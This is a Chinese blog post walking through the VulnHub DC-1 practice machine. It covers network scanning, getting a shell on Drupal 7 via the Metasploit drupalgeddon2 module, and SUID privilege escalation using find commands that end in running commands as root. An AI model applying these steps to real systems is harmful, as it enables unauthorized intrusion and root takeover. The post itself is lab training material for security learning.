---
layout: post
title: 'linux提权'
subtitle: 'SUID提权'
date: 2021-06-05
categories: 技术
cover: 'http://on2171g4d.bkt.clouddn.com/jekyll-theme-h2o-postcover.jpg'
tags: 网络安全
---
### linux SUID提权
> 1.下载环境
https://www.vulnhub.com/entry/dc-1-1,292/

用vm虚拟机打开，运行，并设置桥接
> 2.用masscan扫描与主机同一内网的80端口，查找网站地址
![](https://1024861435.github.io/assets/img/suid1.png)
发现有三个主机开启80端口，.1肯定路由器，于是用网站访问192.168.1.137发现该网站
![](https://1024861435.github.io/assets/img/suid2.png)
发现访问到该网站，得到该服务器IP地址
> 3.用kali的masscan查询该网站信息
![](https://1024861435.github.io/assets/img/suid3.png)
发现是durpal 7框架
> 4.开启msfconselo并search durpal
![](https://1024861435.github.io/assets/img/suid4.png)
使用模块exploit/unix/webapp/drupal_drupalgeddon2并执行shell
![](https://1024861435.github.io/assets/img/suid5.png)
> 5.查找符合suid条件的文件
find / -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;
![](https://1024861435.github.io/assets/img/suid6.png)
> 6.如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。
touch test

find test -exec whoami \;

![](https://1024861435.github.io/assets/img/suid7.png)
> 7.用root权限访问root并得到flag文件
![](https://1024861435.github.io/assets/img/suid8.png)
      